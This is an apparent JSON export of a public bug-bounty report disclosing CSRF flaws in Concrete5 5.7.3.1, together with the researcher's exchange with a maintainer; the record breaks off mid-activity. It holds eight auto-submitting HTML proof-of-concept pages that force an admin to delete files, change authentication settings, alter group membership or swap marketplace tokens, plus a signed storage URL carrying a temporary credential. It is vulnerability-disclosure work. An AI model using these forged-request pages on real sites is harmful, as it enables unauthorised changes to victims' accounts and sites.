{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-05-27T18:27:57.917Z", 
    "voters": [
        "mak", 
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 59660, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Multiple Cross Site Request Forgery Vulnerabilities in Concrete5 version 5.7.3.1", 
    "is_member_of_team?": null, 
    "vote_count": 2, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-06-26T18:27:58.055Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "Concrete5-Multiple-CSRF.pdf", 
            "type": "application/pdf", 
            "id": 36773, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/036/773/c61bb93c0bdb716c720115185000a8b859d4ff12/Concrete5-Multiple-CSRF.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225231Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=69f798812f6c4a3e8a0700a35abad1865ccb8ced7bfcc47db55dcde543a19aae"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-06-17T18:43:50.342Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-17T18:43:50.342Z", 
            "actor": {
                "username": "korvin", 
                "url": "/korvin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/454/9a0e6f861d861e27945d02c73b3598bb6abb5bff_medium.jpg?1406656654"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "Hi Egix,\nCan you describe the issues outside of the PDF?\n\nBest wishes,\nKorvin", 
            "markdown_message": "<p>Hi Egix,<br>\nCan you describe the issues outside of the PDF?</p>\n\n<p>Best wishes,<br>\nKorvin</p>\n", 
            "type": "Activities::Comment", 
            "id": 475630, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-18T07:53:37.726Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-18T07:53:37.726Z", 
            "actor": {
                "username": "egix", 
                "url": "/egix", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/431/92370e402d31aa527a1cba9b40e80c7f5d39e586_medium.jpg?1429523399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "Hey Korvin,\nWhat do you want to know exactly?", 
            "markdown_message": "<p>Hey Korvin,<br>\nWhat do you want to know exactly?</p>\n", 
            "type": "Activities::Comment", 
            "id": 476160, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-18T17:27:18.151Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-18T17:27:18.151Z", 
            "actor": {
                "username": "korvin", 
                "url": "/korvin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/454/9a0e6f861d861e27945d02c73b3598bb6abb5bff_medium.jpg?1406656654"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "There's nothing I want to know that I couldn't get from the PDF, more info in a comment will allow other people to read about the security issue without having to download an untrusted PDF.", 
            "markdown_message": "<p>There&#39;s nothing I want to know that I couldn&#39;t get from the PDF, more info in a comment will allow other people to read about the security issue without having to download an untrusted PDF.</p>\n", 
            "type": "Activities::Comment", 
            "id": 476613, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-18T18:42:21.368Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-18T18:42:21.368Z", 
            "actor": {
                "username": "egix", 
                "url": "/egix", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/431/92370e402d31aa527a1cba9b40e80c7f5d39e586_medium.jpg?1429523399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "These are the CSRF attack vectors described in the PDF:\n\n- __File Manager - Delete__: an attacker might force an authenticated user to delete files from the File Manager by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/tools/required/files/delete\">\n<input type=\"hidden\" name=\"task\" value=\"delete_files\">\n<input type=\"hidden\" name=\"fID[]\" value=\"1\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Public Registration Settings__: an attacker might force an authenticated user to change the Public Registration Settings by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/dashboard/system/registration/open/update_registration_type\">\n<input type=\"hidden\" name=\"registration_type\" value=\"enabled\">\n<input type=\"hidden\" name=\"ccm-submit-registration-type-form\" value=\"Save\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Public Profiles Settings__: an attacker might force an authenticated user to change the Public Profiles Settings by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/dashboard/system/registration/profiles/update_profiles\">\n<input type=\"hidden\" name=\"public_profiles\" value=\"1\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Authentication Types Settings__: an attacker might force an authenticated user to enable or disable an authentication type, or change its settings by tricking the victim into browsing to a web page like this (settings for Google authentication type):\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/dashboard/system/registration/authentication/save/5\">\n<input type=\"hidden\" name=\"apikey\" value=\"my_key\">\n<input type=\"hidden\" name=\"apisecret\" value=\"my_secret\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Community Points__: an attacker might force an authenticated user to assign points to arbitrary users, or add, delete, and edit Community Points Actions by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/dashboard/users/points/actions/save\">\n<input type=\"hidden\" name=\"upaHandle\" value=\"my_hanlde\">\n<input type=\"hidden\" name=\"upaName\" value=\"my_action\">\n<input type=\"hidden\" name=\"upaIsActive\" value=\"1\">\n<input type=\"hidden\" name=\"upaDefaultPoints\" value=\"1\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Translation Site Interface__: an attacker might force an authenticated user to save arbitrary translation strings by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/dashboard/system/multilingual/translate_interface/save_translation\">\n<input type=\"hidden\" name=\"mtID\" value=\"1\">\n<input type=\"hidden\" name=\"msgstr\" value=\"my_translation\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Add / Remove Group__: an attacker might force an authenticated user to add/remove an arbitrary user to/from a group by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/ccm/system/user/add_group\">\n<input type=\"hidden\" name=\"gID\" value=\"3\">\n<input type=\"hidden\" name=\"uID\" value=\"1\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n- __Community Connect__: an attacker might force an authenticated user to change tokens used to connect to the marketplace by tricking the victim into browsing to a web page like this:\n\n```\n<html>\n<body>\n<form method=\"POST\" action=\"http://[host]/index.php/dashboard/extend/connect/connect_complete\">\n<input type=\"hidden\" name=\"csToken\" value=\"my_token\">\n<input type=\"hidden\" name=\"csURLToken\" value=\"my_URL_token\">\n</form>\n<script>document.forms[0].submit()</script>\n</body>\n</html>\n```\n\nEven though some of them don't have a direct security impact, they could be abused to exploit further vulnerabilities like the sendmail vulnerability #59663 and the multiple stored XSS vulnerabilities #59662.", 
            "markdown_message": "<p>These are the CSRF attack vectors described in the PDF:</p>\n\n<ul>\n<li>\n<strong>File Manager - Delete</strong>: an attacker might force an authenticated user to delete files from the File Manager by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/tools/required/files/delete&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;task&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;delete_files&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;fID[]&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Public Registration Settings</strong>: an attacker might force an authenticated user to change the Public Registration Settings by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/dashboard/system/registration/open/update_registration_type&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;registration_type&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;enabled&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;ccm-submit-registration-type-form&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Save&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Public Profiles Settings</strong>: an attacker might force an authenticated user to change the Public Profiles Settings by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/dashboard/system/registration/profiles/update_profiles&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;public_profiles&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Authentication Types Settings</strong>: an attacker might force an authenticated user to enable or disable an authentication type, or change its settings by tricking the victim into browsing to a web page like this (settings for Google authentication type):</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/dashboard/system/registration/authentication/save/5&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;apikey&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_key&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;apisecret&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_secret&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Community Points</strong>: an attacker might force an authenticated user to assign points to arbitrary users, or add, delete, and edit Community Points Actions by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/dashboard/users/points/actions/save&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;upaHandle&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_hanlde&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;upaName&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_action&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;upaIsActive&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;upaDefaultPoints&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Translation Site Interface</strong>: an attacker might force an authenticated user to save arbitrary translation strings by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/dashboard/system/multilingual/translate_interface/save_translation&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;mtID&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;msgstr&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_translation&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Add / Remove Group</strong>: an attacker might force an authenticated user to add/remove an arbitrary user to/from a group by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/ccm/system/user/add_group&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;gID&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;3&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;uID&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;1&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<ul>\n<li>\n<strong>Community Connect</strong>: an attacker might force an authenticated user to change tokens used to connect to the marketplace by tricking the victim into browsing to a web page like this:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;http://[host]/index.php/dashboard/extend/connect/connect_complete&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;csToken&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_token&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;csURLToken&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;my_URL_token&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">forms</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">submit</span><span class=\"p\">()</span><span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>Even though some of them don&#39;t have a direct security impact, they could be abused to exploit further vulnerabilities like the sendmail vulnerability <a href=\"/reports/59663\">#59663</a> and the multiple stored XSS vulnerabilities <a href=\"/reports/59662\">#59662</a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 476707, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-19T08:33:40.677Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-19T08:33:40.677Z", 
            "actor": {
                "username": "egix", 
                "url": "/egix", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/431/92370e402d31aa527a1cba9b40e80c7f5d39e586_medium.jpg?1429523399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "Please keep in mind that we reported only few of the possible vectors. There are other CSRF attacks working - for instance, in the File Manager the deletion is not the only operation vulnerable to CSRF - because the issue is due to a design problem:\n\n*Concrete5 implements a Synchronizer Token Pattern in order to provide anti-CSRF capabilities, which is done within the Concrete\\Core\\Validation\\CSRF\\Token class. However, the application fails to properly use this feature in every block or dashboard page which makes a system state change, such as settings modification.*\n\nThe issue is caused by this wrong implementation, because Concrete5 has a feature to prevent CSRF attacks, but this is not used for every request (both GET or POST) which change the system status.\n\nI think a generic solution for this would be something like a CSRF token check inside the *AbstractController* constructor method, so you can check the token for every request server-side, and add the token generation in every form and AJAX request which can change the system status.", 
            "markdown_message": "<p>Please keep in mind that we reported only few of the possible vectors. There are other CSRF attacks working - for instance, in the File Manager the deletion is not the only operation vulnerable to CSRF - because the issue is due to a design problem:</p>\n\n<p><em>Concrete5 implements a Synchronizer Token Pattern in order to provide anti-CSRF capabilities, which is done within the Concrete\\Core\\Validation\\CSRF\\Token class. However, the application fails to properly use this feature in every block or dashboard page which makes a system state change, such as settings modification.</em></p>\n\n<p>The issue is caused by this wrong implementation, because Concrete5 has a feature to prevent CSRF attacks, but this is not used for every request (both GET or POST) which change the system status.</p>\n\n<p>I think a generic solution for this would be something like a CSRF token check inside the <em>AbstractController</em> constructor method, so you can check the token for every request server-side, and add the token generation in every form and AJAX request which can change the system status.</p>\n", 
            "type": "Activities::Comment", 
            "id": 477170, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-09-01T13:04:21.735Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-01T13:04:21.735Z", 
            "actor": {
                "username": "egix", 
                "url": "/egix", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/431/92370e402d31aa527a1cba9b40e80c7f5d39e586_medium.jpg?1429523399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "Hi!\n\nIs there any update with regards to the fix for this vulnerabilities? As an aside, I noticed that #64184 and #65808 are the same bugs I firstly reported (not just the CSRF issue, but the stored XSS as well reported in #59662). ", 
            "markdown_message": "<p>Hi!</p>\n\n<p>Is there any update with regards to the fix for this vulnerabilities? As an aside, I noticed that <a href=\"/reports/64184\">#64184</a> and <a href=\"/reports/65808\">#65808</a> are the same bugs I firstly reported (not just the CSRF issue, but the stored XSS as well reported in <a href=\"/reports/59662\">#59662</a>). </p>\n", 
            "type": "Activities::Comment", 
            "id": 571201, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-12-18T23:49:53.711Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-18T23:49:53.711Z", 
            "actor": {
                "username": "korvin", 
                "url": "/korvin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/454/9a0e6f861d861e27945d02c73b3598bb6abb5bff_medium.jpg?1406656654"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "For every CSRF issue we see reported, we get about 2 or 3 duplicates. Because people have submitted them as individual issues, it's much easier to track the fixes.", 
            "markdown_message": "<p>For every CSRF issue we see reported, we get about 2 or 3 duplicates. Because people have submitted them as individual issues, it&#39;s much easier to track the fixes.</p>\n", 
            "type": "Activities::Comment", 
            "id": 726396, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-12-19T12:12:51.388Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-19T12:12:51.388Z", 
            "actor": {
                "username": "egix", 
                "url": "/egix", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/431/92370e402d31aa527a1cba9b40e80c7f5d39e586_medium.jpg?1429523399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
            "message": "What do you mean exactly? Should I open a new report for every single possible CSRF attack? I think you're missing the point with this issue: as I already said, this is a design issue (kinda), because I believe that Concrete5 should have CSRF checks in every controller, block or dashboard page which allow to change data somehow, not only for ones who have a real security impact. As you can see, some of the CSRF vectors I reported here do not have a direct security impact, but they can be leveraged to exploit further vulnerabilities like Stored XSS or the Sendmail RCE.", 
            "markdown_message": "<p>What do you mean exactly? Should I open a new report for every single possible CSRF attack? I think you&#39;re missing the point with this issue: as I already said, this is a design issue (kinda), because I believe that Concrete5 should have CSRF checks in every controller, block or dashboard page which allow to change data somehow, not only for ones who have a real security impact. As you can see, some of the CSRF vectors I reported here do not have a direct security impact, but they can be leveraged to exploit further vulnerabilities like Stored XSS or the Sendmail RCE.</p>\n", 
            "type": "Activities::Comment", 
            "id": 726764, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "egix", 
                "url": "/egix"
            }, 
            "created_at": "2015-12-28T02:41:10.966Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-28T02:41:10.966Z", 
            "actor": {
                "username": "korvin", 
                "url": "/korvin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/454/9a0e6f861d861e27945d02c73b3598bb6abb5bff_medium.jpg?1406656654"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "concrete5", 
